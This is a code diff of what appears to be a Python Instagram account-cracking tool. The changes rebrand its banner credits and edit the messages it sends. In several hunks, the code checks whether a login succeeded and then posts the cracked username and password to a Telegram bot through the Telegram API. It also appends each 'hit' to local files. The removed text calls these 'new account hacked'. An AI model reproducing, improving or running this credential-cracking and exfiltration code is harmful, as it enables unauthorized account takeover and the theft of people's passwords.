@@ -65,10 +65,9 @@ print("""
 `------'  `------'`--' '--'`--' `--' `-----'  
 
  By👉@Y_U_56
-WELOCOME To TOOL SHudeCHannel
- CHannel👉@SHudeCHannel
-
- CHRUP👉@SHudeGRUP
+WELOCOME To TOOL python453
+ CHannel👉@python453
+bot>@python453bot
 
  
                            """)
@@ -138,7 +137,7 @@ if ask == "1":
         #print(r.text)
         if "logged_in_user" in r.text:
             if "Y" or "y" in tele:
-                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n  {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n\n")
+                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n  {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\nBy >@pytho453 : @python453bot\n")
             open("Hits.txt","a").write(f"{user}:{pasw}\n")
             h += 1
             print(f"\033[1;91m                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
@@ -206,7 +205,7 @@ elif ask =="2":
         #print(r.text)
         if "logged_in_user" in r.text:
             if "Y" or "y" in tele:
-                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜᴇʟʟᴏ Bekas ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴄᴋᴇᴅ ✅\n✹✹✹✹✹✹✹✹✹✹✹✹✹\n\n[=] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} \n\[=] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pasw}\n\n✹✹✹✹✹✹✹✹✹✹✹✹✹\nBy @bekashacker")
+                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n[=] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} \n\[=] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pasw}\n\n\n")
          
             open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
             h += 1
